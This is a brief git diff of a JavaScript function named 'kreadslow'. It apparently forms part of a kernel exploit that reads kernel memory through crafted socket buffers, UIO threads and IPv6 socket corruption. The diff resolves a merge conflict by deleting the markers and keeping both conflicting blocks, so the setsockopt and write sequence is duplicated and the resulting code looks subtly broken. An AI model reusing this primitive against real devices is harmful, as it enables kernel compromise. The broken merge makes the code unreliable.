@@ -1507,7 +1507,6 @@ function kreadslow (addr, size) {
     }
   }
 
-<<<<<<< HEAD
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
       write64(leak_buffers[i], LEAK_TAG);
   }
@@ -1516,12 +1515,11 @@ function kreadslow (addr, size) {
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
   write(new BigInt(uio_sock_1), tmp, size);
   write64(uioIovRead.add(0x08), size);
-=======
   write32(sockopt_val_buf, size)
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
   write(new BigInt(uio_sock_1), tmp, size)
   write64(uioIovRead.add(0x08), size)
->>>>>>> da2d104374a282c2f30ed3290a1b155a6df096ea
+
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
     log('kreadslow: invalid triplets[1]')
     return BigInt_Error
